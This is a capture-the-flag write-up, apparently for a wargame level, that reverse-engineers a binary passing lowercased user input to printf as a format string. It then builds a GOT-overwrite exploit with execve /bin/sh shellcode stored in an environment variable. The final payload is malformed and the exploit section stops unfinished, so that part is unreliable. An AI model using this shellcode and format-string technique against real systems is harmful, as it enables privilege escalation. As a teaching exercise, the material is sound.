# PRINTF FORMAT STRING VULNERABILITY

## Reverse engineering

```shell
(gdb) p/x *0x80497f0
$3 = 0x0
```
```asm
08048444 <main>:
 8048444:	55                   	push   ebp
 8048445:	89 e5                	mov    ebp,esp
 8048447:	57                   	push   edi
 8048448:	53                   	push   ebx
 8048449:	83 e4 f0             	and    esp,0xfffffff0
 804844c:	81 ec 90 00 00 00    	sub    esp,0x90
 8048452:	c7 84 24 8c 00 00 00 	mov    DWORD PTR [esp+0x8c],0x0
 8048459:	00 00 00 00 
 804845d:	a1 f0 97 04 08       	mov    eax,ds:0x80497f0
 8048462:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 8048466:	c7 44 24 04 64 00 00 	mov    DWORD PTR [esp+0x4],0x64
 804846d:	00 
 804846e:	8d 44 24 28          	lea    eax,[esp+0x28]
 8048472:	89 04 24             	mov    DWORD PTR [esp],eax
 8048475:	e8 d6 fe ff ff       	call   8048350 <fgets@plt>
```
- The stack grows 0x90 bytes (144) for local variables, then 0 is stored at [esp+0x8], 0x64 is stored at [esp+0x4], and the address of [esp+0x28] is stored at [esp].
- It's a called to fgets to fill the buffer at [esp+0x28], with a max of 0x64 bytes (100), from stdin.

```
 Oct   Dec   Hex   Char                        Oct   Dec   Hex   Char
       ────────────────────────────────────────────────────────────────────────
       000   0     00    NUL '\0'                    100   64    40    @
       001   1     01    SOH (start of heading)      101   65    41    A
       002   2     02    STX (start of text)         102   66    42    B
       003   3     03    ETX (end of text)           103   67    43    C
       004   4     04    EOT (end of transmission)   104   68    44    D
       005   5     05    ENQ (enquiry)               105   69    45    E
       006   6     06    ACK (acknowledge)           106   70    46    F
       007   7     07    BEL '\a' (bell)             107   71    47    G
       010   8     08    BS  '\b' (backspace)        110   72    48    H
       011   9     09    HT  '\t' (horizontal tab)   111   73    49    I
       012   10    0A    LF  '\n' (new line)         112   74    4A    J
       013   11    0B    VT  '\v' (vertical tab)     113   75    4B    K
       014   12    0C    FF  '\f' (form feed)        114   76    4C    L
       015   13    0D    CR  '\r' (carriage ret)     115   77    4D    M
       016   14    0E    SO  (shift out)             116   78    4E    N
       017   15    0F    SI  (shift in)              117   79    4F    O
       020   16    10    DLE (data link escape)      120   80    50    P
       021   17    11    DC1 (device control 1)      121   81    51    Q
       022   18    12    DC2 (device control 2)      122   82    52    R
       023   19    13    DC3 (device control 3)      123   83    53    S
       024   20    14    DC4 (device control 4)      124   84    54    T
       025   21    15    NAK (negative ack.)         125   85    55    U
       026   22    16    SYN (synchronous idle)      126   86    56    V
       027   23    17    ETB (end of trans. blk)     127   87    57    W
       030   24    18    CAN (cancel)                130   88    58    X
       031   25    19    EM  (end of medium)         131   89    59    Y
       032   26    1A    SUB (substitute)            132   90    5A    Z
       033   27    1B    ESC (escape)                133   91    5B    [
```
```asm
 804847a:	c7 84 24 8c 00 00 00 	mov    DWORD PTR [esp+0x8c],0x0
 8048481:	00 00 00 00 
 8048485:	eb 4c                	jmp    80484d3 <main+0x8f>
 8048487:	8d 44 24 28          	lea    eax,[esp+0x28]
 804848b:	03 84 24 8c 00 00 00 	add    eax,DWORD PTR [esp+0x8c]
 8048492:	0f b6 00             	movzx  eax,BYTE PTR [eax]
 8048495:	3c 40                	cmp    al,0x40
 8048497:	7e 32                	jle    80484cb <main+0x87>
 8048499:	8d 44 24 28          	lea    eax,[esp+0x28]
 804849d:	03 84 24 8c 00 00 00 	add    eax,DWORD PTR [esp+0x8c]
 80484a4:	0f b6 00             	movzx  eax,BYTE PTR [eax]
 80484a7:	3c 5a                	cmp    al,0x5a
```
- Here 0x40 and 0x5a are the ASCII codes for '@' and 'Z', so it's checking if the character is between '@' and 'Z'. Meaning if the character is an uppercase letter

```asm
 80484a9:	7f 20                	jg     80484cb <main+0x87>
 80484ab:	8d 44 24 28          	lea    eax,[esp+0x28]
 80484af:	03 84 24 8c 00 00 00 	add    eax,DWORD PTR [esp+0x8c]
 80484b6:	0f b6 00             	movzx  eax,BYTE PTR [eax]
 80484b9:	89 c2                	mov    edx,eax
 80484bb:	83 f2 20             	xor    edx,0x20
 80484be:	8d 44 24 28          	lea    eax,[esp+0x28]
 80484c2:	03 84 24 8c 00 00 00 	add    eax,DWORD PTR [esp+0x8c]
 80484c9:	88 10                	mov    BYTE PTR [eax],dl
 80484cb:	83 84 24 8c 00 00 00 	add    DWORD PTR [esp+0x8c],0x1
 80484d2:	01 
 80484d3:	8b 9c 24 8c 00 00 00 	mov    ebx,DWORD PTR [esp+0x8c]
 80484da:	8d 44 24 28          	lea    eax,[esp+0x28]
 80484de:	c7 44 24 1c ff ff ff 	mov    DWORD PTR [esp+0x1c],0xffffffff
 80484e5:	ff 
 80484e6:	89 c2                	mov    edx,eax
 80484e8:	b8 00 00 00 00       	mov    eax,0x0
 80484ed:	8b 4c 24 1c          	mov    ecx,DWORD PTR [esp+0x1c]
 80484f1:	89 d7                	mov    edi,edx
 80484f3:	f2 ae                	repnz scas al,BYTE PTR es:[edi]
 80484f5:	89 c8                	mov    eax,ecx
 80484f7:	f7 d0                	not    eax
 80484f9:	83 e8 01             	sub    eax,0x1
 80484fc:	39 c3                	cmp    ebx,eax
 80484fe:	72 87                	jb     8048487 <main+0x43>
```
- It's converting the uppercase letters to lowercase letters by xoring code with 0x20
- Then it counts the number of characters until the null terminator is found, and compares it to the number of characters processed. If they are not equal, it loops back to process the next character.

```asm
 8048500:	8d 44 24 28          	lea    eax,[esp+0x28]
 8048504:	89 04 24             	mov    DWORD PTR [esp],eax
 8048507:	e8 34 fe ff ff       	call   8048340 <printf@plt>
 804850c:	c7 04 24 00 00 00 00 	mov    DWORD PTR [esp],0x0
 8048513:	e8 58 fe ff ff       	call   8048370 <exit@plt>
 8048518:	90                   	nop
```
- Then its using the user input (lowercased) as a format string for printf, then it exits the program.

### Did we understand the binary correctly?

```shell
~$ ./level05 
ABCDE1234 abcde-=][\
abcde1234 abcde-=][\
```
Yes!

## Exploitation

We can put a shellcode in the env variables, then use the format string vulnerability to overwrite the exit() function address in the GOT with the address of our shellcode variable address.

### Finding the format string position

```shell
~$ (python -c 'print "A"*4 + " %x"*20'; cat) | ./level05
aaaa 64 f7fcfac0 f7ec3add ffffd6df ffffd6de 0 ffffffff ffffd764 f7fdb000 61616161 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520
```
- The format string position is the 10th argument.

### Finding the address of the shellcode in the env variables

```shell
~$ export SHELLCODE=$(python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
~$ echo "$SHELLCODE"
1���
    Qh//shh/bin��̀

```


### Finding the address of the exit function in the GOT

```asm
08048370 <exit@plt>:
 8048370:	ff 25 e0 97 04 08    	jmp    DWORD PTR ds:0x80497e0
 8048376:	68 18 00 00 00       	push   0x18
 804837b:	e9 b0 ff ff ff       	jmp    8048330 <_init+0x38>
```
- The exit function address in the GOT is 0x80497e0

### Assemble the ret2shellcode attack

```shell
~$ python -c 'print "\xe0\x97\x04\x08" + "\x90"*80 + "$9%n"' > /tmp/exploit05


### Exploit 
